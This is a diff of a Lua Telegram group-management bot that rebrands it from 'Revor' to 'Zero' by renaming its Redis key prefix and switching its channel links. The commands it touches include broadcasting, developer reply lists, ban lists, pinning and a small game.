-Redis:setex(Revor.."Revor:Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
+Redis:setex(Zero .."Zero :Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
 LuaTele.sendText(msg_chat_id,msg_id,[[
 ↯︙ارسل لي سواء كان 
 ❨ ملف • ملصق • متحركه • صوره
@@ -10258,10 +10261,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
+Redis:setex(Zero .."Zero :Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
 LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل لي التوجيه الان\n⌔︙ليتم نشره في المجموعات","md",true)  
 return false
 end
@@ -10271,10 +10274,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
+Redis:setex(Zero .."Zero :Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
 LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل لي التوجيه الان\n⌔︙ليتم نشره الى المشتركين","md",true)  
 return false
 end
@@ -10284,29 +10287,29 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:List:Rd:Sudo")
+local list = Redis:smembers(Zero .."Zero :List:Rd:Sudo")
 text = "\n📝︙قائمة ردود المطور \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
 for k,v in pairs(list) do
-if Redis:get(Revor.."Revor:Add:Rd:Sudo:Gif"..v) then
+if Redis:get(Zero .."Zero :Add:Rd:Sudo:Gif"..v) then
 db = "متحركه 🎭"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:vico"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:vico"..v) then
 db = "بصمه 📢"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:stekr"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:stekr"..v) then
 db = "ملصق 🃏"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:Text"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:Text"..v) then
 db = "رساله ✉"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:Photo"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:Photo"..v) then
 db = "صوره 🎇"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:Video"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:Video"..v) then
 db = "فيديو 📹"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:File"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:File"..v) then
 db = "ملف ⌔"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:Audio"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:Audio"..v) then
 db = "اغنيه 🎵"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:video_note"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:video_note"..v) then
 db = "بصمه فيديو 🎥"
 end
 text = text..""..k.." » {"..v.."} » {"..db.."}\n"
@@ -10321,21 +10324,21 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:List:Rd:Sudo")
+local list = Redis:smembers(Zero .."Zero :List:Rd:Sudo")
 for k,v in pairs(list) do
-Redis:del(Revor.."Revor:Add:Rd:Sudo:Gif"..v)   
-Redis:del(Revor.."Revor:Add:Rd:Sudo:vico"..v)   
-Redis:del(Revor.."Revor:Add:Rd:Sudo:stekr"..v)     
-Redis:del(Revor.."Revor:Add:Rd:Sudo:Text"..v)   
-Redis:del(Revor.."Revor:Add:Rd:Sudo:Photo"..v)
-Redis:del(Revor.."Revor:Add:Rd:Sudo:Video"..v)
-Redis:del(Revor.."Revor:Add:Rd:Sudo:File"..v)
-Redis:del(Revor.."Revor:Add:Rd:Sudo:Audio"..v)
-Redis:del(Revor.."Revor:Add:Rd:Sudo:video_note"..v)
-Redis:del(Revor.."Revor:List:Rd:Sudo")
+Redis:del(Zero .."Zero :Add:Rd:Sudo:Gif"..v)   
+Redis:del(Zero .."Zero :Add:Rd:Sudo:vico"..v)   
+Redis:del(Zero .."Zero :Add:Rd:Sudo:stekr"..v)     
+Redis:del(Zero .."Zero :Add:Rd:Sudo:Text"..v)   
+Redis:del(Zero .."Zero :Add:Rd:Sudo:Photo"..v)
+Redis:del(Zero .."Zero :Add:Rd:Sudo:Video"..v)
+Redis:del(Zero .."Zero :Add:Rd:Sudo:File"..v)
+Redis:del(Zero .."Zero :Add:Rd:Sudo:Audio"..v)
+Redis:del(Zero .."Zero :Add:Rd:Sudo:video_note"..v)
+Redis:del(Zero .."Zero :List:Rd:Sudo")
 end
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف ردود المطور","md",true)  
 end
@@ -10344,14 +10347,14 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:Developers:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :Developers:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مطورين حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:Developers:Groups") 
+Redis:del(Zero .."Zero :Developers:Groups") 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المطورين *","md",true)
 end
 if text == 'مسح المطورين الثانويين ⌔' then
@@ -10359,14 +10362,14 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:DevelopersQ:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :DevelopersQ:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مطورين حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:DevelopersQ:Groups") 
+Redis:del(Zero .."Zero :DevelopersQ:Groups") 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المطورين *","md",true)
 end
 if text == 'مسح قائمه العام ⌔' then
@@ -10374,14 +10377,14 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:BanAll:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :BanAll:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد محظورين عام حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:BanAll:Groups") 
+Redis:del(Zero .."Zero :BanAll:Groups") 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المحظورين عام *","md",true)
 end
 if text == 'تعطيل البوت الخدمي ⌔' then
@@ -10389,10 +10392,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:BotFree") 
+Redis:del(Zero .."Zero :BotFree") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل البوت الخدمي ","md",true)
 end
 if text == 'تعطيل التواصل ⌔' then
@@ -10400,10 +10403,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:TwaslBot") 
+Redis:del(Zero .."Zero :TwaslBot") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل التواصل داخل البوت ","md",true)
 end
 if text == 'تفعيل البوت الخدمي ⌔' then
@@ -10411,10 +10414,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:BotFree",true) 
+Redis:set(Zero .."Zero :BotFree",true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل البوت الخدمي ","md",true)
 end
 if text == 'تفعيل التواصل ⌔' then
@@ -10422,10 +10425,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:TwaslBot",true) 
+Redis:set(Zero .."Zero :TwaslBot",true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل التواصل داخل البوت ","md",true)
 end
 if text == 'قائمه العام ⌔' then
@@ -10433,10 +10436,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:BanAll:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :BanAll:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد محظورين عام حاليا , ","md",true)  
 end
@@ -10460,10 +10463,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:Developers:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :Developers:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مطورين حاليا , ","md",true)  
 end
@@ -10486,10 +10489,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:DevelopersQ:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :DevelopersQ:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مطورين حاليا , ","md",true)  
 end
@@ -10508,12 +10511,12 @@ data = {{{text = '- مسح المطورين', data = msg.sender.user_id..'/Devel
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if not msg.ControllerBot then
-if Redis:get(Revor.."Revor:TwaslBot") and not Redis:sismember(Revor.."Revor:BaN:In:Tuasl",msg.sender.user_id) then
+if Redis:get(Zero .."Zero :TwaslBot") and not Redis:sismember(Zero .."Zero :BaN:In:Tuasl",msg.sender.user_id) then
 local ListGet = {Sudo_Id,msg.sender.user_id}
 local IdSudo = LuaTele.getChat(ListGet[1]).id
 local IdUser = LuaTele.getChat(ListGet[2]).id
 local FedMsg = LuaTele.sendForwarded(IdSudo, 0, IdUser, msg_id)
-Redis:setex(Revor.."Revor:Twasl:UserId"..msg.date,172800,IdUser)
+Redis:setex(Zero .."Zero :Twasl:UserId"..msg.date,172800,IdUser)
 if FedMsg.content.luatele == "messageSticker" then
 LuaTele.sendText(IdSudo,0,Reply_Status(IdUser,'⌔︙قام بارسال الملصق').Reply,"md",true)  
 end
@@ -10523,13 +10526,13 @@ else
 if msg.reply_to_message_id ~= 0 then
 local Message_Get = LuaTele.getMessage(msg_chat_id, msg.reply_to_message_id)
 if Message_Get.forward_info then
-local Info_User = Redis:get(Revor.."Revor:Twasl:UserId"..Message_Get.forward_info.date) or 46899864
+local Info_User = Redis:get(Zero .."Zero :Twasl:UserId"..Message_Get.forward_info.date) or 46899864
 if text == 'حظر' then
-Redis:sadd(Revor..'Revor:BaN:In:Tuasl',Info_User)  
+Redis:sadd(Zero ..'Zero :BaN:In:Tuasl',Info_User)  
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Info_User,'⌔︙تم حظره من تواصل البوت ').Reply,"md",true)  
 end 
 if text =='الغاء الحظر' or text =='الغاء حظر' then
-Redis:srem(Revor..'Revor:BaN:In:Tuasl',Info_User)  
+Redis:srem(Zero ..'Zero :BaN:In:Tuasl',Info_User)  
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Info_User,'⌔︙تم الغاء حظره من تواصل البوت ').Reply,"md",true)  
 end 
 local ChatAction = LuaTele.sendChatAction(Info_User,'Typing')
@@ -10575,10 +10578,10 @@ function CallBackLua(data) --- هذا الكالباك بي الابديت
 if data and data.luatele and data.luatele == "updateSupergroup" then
 local Get_Chat = LuaTele.getChat('-100'..data.supergroup.id)
 if data.supergroup.status.luatele == "chatMemberStatusBanned" then
-Redis:srem(Revor.."Revor:ChekBotAdd",'-100'..data.supergroup.id)
-local keys = Redis:keys(Revor..'*'..'-100'..data.supergroup.id..'*')
-Redis:del(Revor.."Revor:List:Manager"..'-100'..data.supergroup.id)
-Redis:del(Revor.."Revor:Command:List:Group"..'-100'..data.supergroup.id)
+Redis:srem(Zero .."Zero :ChekBotAdd",'-100'..data.supergroup.id)
+local keys = Redis:keys(Zero ..'*'..'-100'..data.supergroup.id..'*')
+Redis:del(Zero .."Zero :List:Manager"..'-100'..data.supergroup.id)
+Redis:del(Zero .."Zero :Command:List:Group"..'-100'..data.supergroup.id)
 for i = 1, #keys do 
 Redis:del(keys[i])
 end
@@ -10591,9 +10594,9 @@ if msg.content.text then
 text = msg.content.text.text
 end
 if msg.content.video_note then
-if msg.content.video_note.video.remote.id == Redis:get(Revor.."Revor:PinMsegees:"..msg.chat_id) then
+if msg.content.video_note.video.remote.id == Redis:get(Zero .."Zero :PinMsegees:"..msg.chat_id) then
 LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
-Redis:del(Revor.."Revor:PinMsegees:"..msg.chat_id)
+Redis:del(Zero .."Zero :PinMsegees:"..msg.chat_id)
 end
 elseif msg.content.photo then
 if msg.content.photo.sizes[1].photo.remote.id then
@@ -10603,56 +10606,56 @@ idPhoto = msg.content.photo.sizes[2].photo.remote.id
 elseif msg.content.photo.sizes[3].photo.remote.id then
 idPhoto = msg.content.photo.sizes[3].photo.remote.id
 end
-if idPhoto == Redis:get(Revor.."Revor:PinMsegees:"..msg.chat_id) then
+if idPhoto == Redis:get(Zero .."Zero :PinMsegees:"..msg.chat_id) then
 LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
-Redis:del(Revor.."Revor:PinMsegees:"..msg.chat_id)
+Redis:del(Zero .."Zero :PinMsegees:"..msg.chat_id)
 end
 elseif msg.content.sticker then 
-if msg.content.sticker.sticker.remote.id == Redis:get(Revor.."Revor:PinMsegees:"..msg.chat_id) then
+if msg.content.sticker.sticker.remote.id == Redis:get(Zero .."Zero :PinMsegees:"..msg.chat_id) then
 LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
-Redis:del(Revor.."Revor:PinMsegees:"..msg.chat_id)
+Redis:del(Zero .."Zero :PinMsegees:"..msg.chat_id)
 end
 elseif msg.content.voice_note then 
-if msg.content.voice_note.voice.remote.id == Redis:get(Revor.."Revor:PinMsegees:"..msg.chat_id) then
+if msg.content.voice_note.voice.remote.id == Redis:get(Zero .."Zero :PinMsegees:"..msg.chat_id) then
 LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
-Redis:del(Revor.."Revor:PinMsegees:"..msg.chat_id)
+Redis:del(Zero .."Zero :PinMsegees:"..msg.chat_id)
 end
 elseif msg.content.video then 
-if msg.content.video.video.remote.id == Redis:get(Revor.."Revor:PinMsegees:"..msg.chat_id) then
+if msg.content.video.video.remote.id == Redis:get(Zero .."Zero :PinMsegees:"..msg.chat_id) then
 LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
-Redis:del(Revor.."Revor:PinMsegees:"..msg.chat_id)
+Redis:del(Zero .."Zero :PinMsegees:"..msg.chat_id)
 end
 elseif msg.content.animation then 
-if msg.content.animation.animation.remote.id ==  Redis:get(Revor.."Revor:PinMsegees:"..msg.chat_id) then
+if msg.content.animation.animation.remote.id ==  Redis:get(Zero .."Zero :PinMsegees:"..msg.chat_id) then
 LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
-Redis:del(Revor.."Revor:PinMsegees:"..msg.chat_id)
+Redis:del(Zero .."Zero :PinMsegees:"..msg.chat_id)
 end
 elseif msg.content.document then
-if msg.content.document.document.remote.id == Redis:get(Revor.."Revor:PinMsegees:"..msg.chat_id) then
+if msg.content.document.document.remote.id == Redis:get(Zero .."Zero :PinMsegees:"..msg.chat_id) then
 LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
-Redis:del(Revor.."Revor:PinMsegees:"..msg.chat_id)
+Redis:del(Zero .."Zero :PinMsegees:"..msg.chat_id)
 end
 elseif msg.content.audio then
-if msg.content.audio.audio.remote.id == Redis:get(Revor.."Revor:PinMsegees:"..msg.chat_id) then
+if msg.content.audio.audio.remote.id == Redis:get(Zero .."Zero :PinMsegees:"..msg.chat_id) then
 LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
-Redis:del(Revor.."Revor:PinMsegees:"..msg.chat_id)
+Redis:del(Zero .."Zero :PinMsegees:"..msg.chat_id)
 end
 elseif text then
-if text == Redis:get(Revor.."Revor:PinMsegees:"..msg.chat_id) then
+if text == Redis:get(Zero .."Zero :PinMsegees:"..msg.chat_id) then
 LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
-Redis:del(Revor.."Revor:PinMsegees:"..msg.chat_id)
+Redis:del(Zero .."Zero :PinMsegees:"..msg.chat_id)
 end
 end
 elseif data and data.luatele and data.luatele == "updateNewMessage" then
 if data.message.content.luatele == "messageChatDeleteMember" or data.message.content.luatele == "messageChatAddMembers" or data.message.content.luatele == "messagePinMessage" or data.message.content.luatele == "messageChatChangeTitle" or data.message.content.luatele == "messageChatJoinByLink" then
-if Redis:get(Revor.."Revor:Lock:tagservr"..data.message.chat_id) then
+if Redis:get(Zero .."Zero :Lock:tagservr"..data.message.chat_id) then
 LuaTele.deleteMessages(data.message.chat_id,{[1]= data.message.id})
 end
 end 
-if tonumber(data.message.sender.user_id) == tonumber(Revor) then
+if tonumber(data.message.sender.user_id) == tonumber(Zero ) then
 return false
 end
-if data.message.content.luatele == "messageChatJoinByLink" and Redis:get(Revor..'Revor:Status:joinet'..data.message.chat_id) == 'true' then
+if data.message.content.luatele == "messageChatJoinByLink" and Redis:get(Zero ..'Zero :Status:joinet'..data.message.chat_id) == 'true' then
     local reply_markup = LuaTele.replyMarkup{
     type = 'inline',
     data = {
@@ -10668,14 +10671,14 @@ File_Bot_Run(data.message,data.message)
 elseif data and data.luatele and data.luatele == "updateMessageEdited" then
 -- data.chat_id -- data.message_id
 local Message_Edit = LuaTele.getMessage(data.chat_id, data.message_id)
-if Message_Edit.sender.user_id == Revor then
+if Message_Edit.sender.user_id == Zero  then
 print('This is Edit for Bot')
 return false
 end
 File_Bot_Run(Message_Edit,Message_Edit)
-Redis:incr(Revor..'Revor:Num:Message:Edit'..data.chat_id..Message_Edit.sender.user_id)
+Redis:incr(Zero ..'Zero :Num:Message:Edit'..data.chat_id..Message_Edit.sender.user_id)
 if Message_Edit.content.luatele == "messageContact" or Message_Edit.content.luatele == "messageVideoNote" or Message_Edit.content.luatele == "messageDocument" or Message_Edit.content.luatele == "messageAudio" or Message_Edit.content.luatele == "messageVideo" or Message_Edit.content.luatele == "messageVoiceNote" or Message_Edit.content.luatele == "messageAnimation" or Message_Edit.content.luatele == "messagePhoto" then
-if Redis:get(Revor.."Revor:Lock:edit"..data.chat_id) then
+if Redis:get(Zero .."Zero :Lock:edit"..data.chat_id) then
 LuaTele.deleteMessages(data.chat_id,{[1]= data.message_id})
 end
 end
@@ -10700,7 +10703,7 @@ if Text and Text:match('/Mahibes(%d+)') then
 local GetMahibes = Text:match('/Mahibes(%d+)') 
 local NumMahibes = math.random(1,6)
 if tonumber(GetMahibes) == tonumber(NumMahibes) then
-Redis:incrby(Revor.."Revor:Num:Add:Games"..ChatId..IdUser, 1)  
+Redis:incrby(Zero .."Zero :Num:Add:Games"..ChatId..IdUser, 1)  
 MahibesText = '*⌔︙الف مبروك حظك حلو اليوم\n⌔︙فزت ويانه وطلعت المحيبس بل عظمه رقم {'..NumMahibes..'}*'
 else
 MahibesText = '*⌔︙للاسف لقد خسرت المحيبس بالعظمه رقم {'..NumMahibes..'}\n⌔︙جرب حضك ويانه مره اخره*'
@@ -10783,7 +10786,7 @@ data = {
 {text = '{ القائمه الرئيسيه }', data = IdUser..'/helpall'},
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -10841,7 +10844,7 @@ data = {
 {text = '{ القائمه الرئيسيه }', data = IdUser..'/helpall'},
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -10900,7 +10903,7 @@ data = {
 {text = '{ القائمه الرئيسيه }', data = IdUser..'/helpall'},
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -10953,7 +10956,7 @@ data = {
 {text = '{ القائمه الرئيسيه }', data = IdUser..'/helpall'},
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -10993,7 +10996,7 @@ data = {
 {text = '{ القائمه الرئيسيه }', data = IdUser..'/helpall'},
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -11048,7 +11051,7 @@ data = {
 {text = '{ القائمه الرئيسيه }', data = IdUser..'/helpall'},
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -11089,7 +11092,7 @@ data = {
